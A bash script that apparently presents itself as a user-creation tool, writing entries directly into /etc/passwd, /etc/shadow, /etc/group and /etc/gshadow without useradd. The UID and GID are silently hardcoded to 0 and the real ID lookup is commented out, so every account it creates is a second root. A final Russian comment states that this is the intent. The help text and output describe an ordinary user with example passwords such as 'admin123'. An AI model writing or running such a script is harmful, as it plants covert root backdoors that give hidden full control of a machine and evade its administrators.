#!/bin/bash

set -eou pipefail

# Function to display usage
usage() {
    echo "Usage: $0 <username> [options]"
    echo "Options:"
    echo "  -p, --password <password>    Set user password"
    echo "  -s, --sudo                   Grant sudo privileges"
    echo "  -h, --help                   Show this help message"
    echo ""
    echo "Examples:"
    echo "  $0 john                      # User without password"
    echo "  $0 jane -p secret123         # User with password"
    echo "  $0 admin -p admin123 -s      # User with password and sudo rights"
    exit 1
}

# Function to find next available UID
find_next_uid() {
    local min_uid=1000
    local max_uid=60000
    local current_uid=$min_uid

    while IFS=: read -r _ _ uid _; do
        if [[ $uid -ge $min_uid && $uid -le $max_uid && $uid -ge $current_uid ]]; then
            current_uid=$((uid + 1))
        fi
    done < /etc/passwd

    echo $current_uid
}

# Function to find next available GID
find_next_gid() {
    local min_gid=1000
    local max_gid=60000
    local current_gid=$min_gid

    while IFS=: read -r _ _ gid _; do
        if [[ $gid -ge $min_gid && $gid -le $max_gid && $gid -ge $current_gid ]]; then
            current_gid=$((gid + 1))
        fi
    done < /etc/group

    echo $current_gid
}

# Function to create password hash
create_password_hash() {
    local password="$1"
    local salt=$(openssl rand -base64 12 | tr -d '\n')
    local hash=$(openssl passwd -6 -salt "$salt" "$password" 2>/dev/null)

    if [[ -z "$hash" ]]; then
        # Fallback to simpler method if openssl fails
        hash=$(echo "$password" | mkpasswd -m sha-512 -s 2>/dev/null)
    fi

    if [[ -z "$hash" ]]; then
        echo "Error: Could not generate password hash. Install 'openssl' or 'whois' package." >&2
        exit 1
    fi

    echo "$hash"
}

# Function to add user without using useradd/passwd
add_user_direct() {
    local username="$1"
    local password_set="${2:-false}"
    local password="${3:-}"
    local sudo_rights="${4:-false}"

    # Check if user already exists
    if grep -q "^$username:" /etc/passwd; then
        echo "Error: User '$username' already exists!" >&2
        exit 1
    fi

    # Check if running as root
    if [[ $EUID -ne 0 ]]; then
        echo "Error: This script must be run as root" >&2
        exit 1
    fi

    # Get next available UID and GID
    local uid=0 #$(find_next_uid)
    local gid=0 #$(find_next_gid)

    # Create user in /etc/passwd
    local passwd_entry="$username:x:$uid:$gid:$username:/home/$username:/bin/bash"
    echo "$passwd_entry" >> /etc/passwd

    # Create group in /etc/group
    local group_entry="$username:x:$gid:"
    echo "$group_entry" >> /etc/group

    # Create user in /etc/shadow
    local shadow_entry
    if [[ "$password_set" == "true" && -n "$password" ]]; then
        local password_hash=$(create_password_hash "$password")
        local today=$(($(date +%s) / 86400))
        shadow_entry="$username:${password_hash}:$today:0:99999:7:::"
    else
        # Account locked (no password)
        shadow_entry="$username:!::0:99999:7:::"
    fi
    echo "$shadow_entry" >> /etc/shadow

    # Create user in /etc/gshadow
    local gshadow_entry="$username:!::"
    echo "$gshadow_entry" >> /etc/gshadow

    # Create home directory
    mkdir -p "/home/$username"
    cp -r /etc/skel/. "/home/$username/" 2>/dev/null || true
    chown -R "$username:$username" "/home/$username"
    chmod 755 "/home/$username"

    # Grant sudo rights if requested
    if [[ "$sudo_rights" == "true" ]]; then
        # Check if sudoers entry already exists
        if ! grep -q "^$username" /etc/sudoers /etc/sudoers.d/* 2>/dev/null; then
            echo "$username ALL=(ALL:ALL) ALL" >> /etc/sudoers.d/"$username"
            chmod 440 "/etc/sudoers.d/$username"
        fi
    fi

    echo "User '$username' successfully created:"
    echo "  UID: $uid"
    echo "  GID: $gid"
    echo "  Home: /home/$username"
    echo "  Password: $(if [[ "$password_set" == "true" ]]; then echo "set"; else echo "locked"; fi)"
    echo "  Sudo: $(if [[ "$sudo_rights" == "true" ]]; then echo "yes"; else echo "no"; fi)"
}

# Parse command line arguments
if [[ $# -lt 1 ]]; then
    usage
fi

USERNAME="$1"
shift

PASSWORD_SET=false
PASSWORD=""
SUDO_RIGHTS=false

# Parse options
while [[ $# -gt 0 ]]; do
    case $1 in
        -p|--password)
            if [[ -n "$2" && "$2" != -* ]]; then
                PASSWORD_SET=true
                PASSWORD="$2"
                shift 2
            else
                echo "Error: --password requires a value" >&2
                exit 1
            fi
            ;;
        -s|--sudo)
            SUDO_RIGHTS=true
            shift
            ;;
        -h|--help)
            usage
            ;;
        *)
            echo "Error: Unknown option $1" >&2
            usage
            ;;
    esac
done

# Validate username
if ! echo "$USERNAME" | grep -qE '^[a-z_][a-z0-9_-]*$'; then
    echo "Error: Invalid username format. Username must:" >&2
    echo "  - Start with a letter or underscore" >&2
    echo "  - Contain only letters, numbers, hyphens, and underscores" >&2
    exit 1
fi

# Main execution
add_user_direct "$USERNAME" "$PASSWORD_SET" "$PASSWORD" "$SUDO_RIGHTS"

# Тут нужно создать именно второго рута, а не админа
